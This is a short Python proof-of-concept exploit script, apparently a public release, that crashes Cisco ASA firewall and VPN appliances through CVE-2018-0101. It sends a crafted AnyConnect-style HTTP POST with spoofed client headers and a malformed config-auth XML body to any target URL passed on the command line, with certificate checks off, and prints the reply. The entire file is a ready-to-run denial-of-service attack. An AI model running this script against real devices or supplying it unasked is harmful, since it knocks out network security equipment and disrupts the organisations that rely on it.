#
# Cisco ASA CVE-2018-0101 Crash PoC
#
# We basically just read:
# https://www.nccgroup.trust/globalassets/newsroom/uk/events/2018/02/reconbrx2018-robin-hood-vs-cisco-asa.pdf
#
# @zerosum0x0, @jennamagius, @aleph___naught
#

import requests, sys

headers = {}
headers['User-Agent'] = 'Open AnyConnect VPN Agent
v7.08-265-gae481214-dirty'
headers['Content-Type'] = 'application/x-www-form-urlencoded'
headers['X-Aggregate-Auth'] = '1'
headers['X-Transcend-Version'] = '1'
headers['Accept-Encoding'] = 'identity'
headers['Accept'] = '*/*'
headers['X-AnyConnect-Platform'] = 'linux-64'
headers['X-Support-HTTP-Auth'] = 'false'
headers['X-Pad'] = '0000000000000000000000000000000000000000'

xml = """<?xml version="1.0" encoding="UTF-8"?>
<config-auth client="a" type="a" aggregate-auth-version="a">
    <host-scan-reply>A</host-scan-reply>
</config-auth>
"""

r = requests.post(sys.argv[1], data = xml, headers = headers, verify=False,
allow_redirects=False)

print(r.status_code)
print(r.headers)
print(r.text)